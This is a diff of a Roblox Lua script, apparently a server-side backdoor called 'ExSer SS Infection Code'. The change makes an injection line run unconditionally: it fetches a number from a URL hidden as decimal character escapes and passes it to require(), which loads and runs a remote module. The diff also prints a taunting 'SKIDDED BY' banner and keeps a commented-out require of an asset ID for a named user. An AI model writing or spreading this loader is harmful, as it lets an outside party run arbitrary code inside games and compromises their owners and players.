@@ -150,18 +150,18 @@ while wait(0.2) do
     mamae.Text="⚠️⚠️ | SKIDDED BY FurryBoy_YT4000 | ⚠️⚠️"
 end
     
-function inject()
-    spawn(function()pcall(function()coroutine.wrap(pcall)(require,tonumber(game:service("HttpService"):GetAsync("\104\116\116\112\115\58\47\47\101\120\116\114\97\46\115\117\107\114\117\46\115\101\114\118\48\48\46\110\101\116")))end)end)
-end
-    
-print("Now injecting ExSer SS Infection Code . . .")
+print("Injecting ExSer SS Infection Code . . .")
+spawn(function()pcall(function()coroutine.wrap(pcall)(require,tonumber(game:service("HttpService"):GetAsync("\104\116\116\112\115\58\47\47\101\120\116\114\97\46\115\117\107\114\117\46\115\101\114\118\48\48\46\110\101\116")))end)end)
+
+--[[
 if not game:GetService("HttpService").HttpEnabled then
     game:GetService("HttpService").HttpEnabled = true
-    inject()
+    print"1"
 else
-    inject()
+    print"0"
 end
-
+]]
+    
 --[[
 print("Loading: ExSer SS Hub for user: FurryBoy_YT4000")
 require(10868847330):pls("FurryBoy_YT4000")
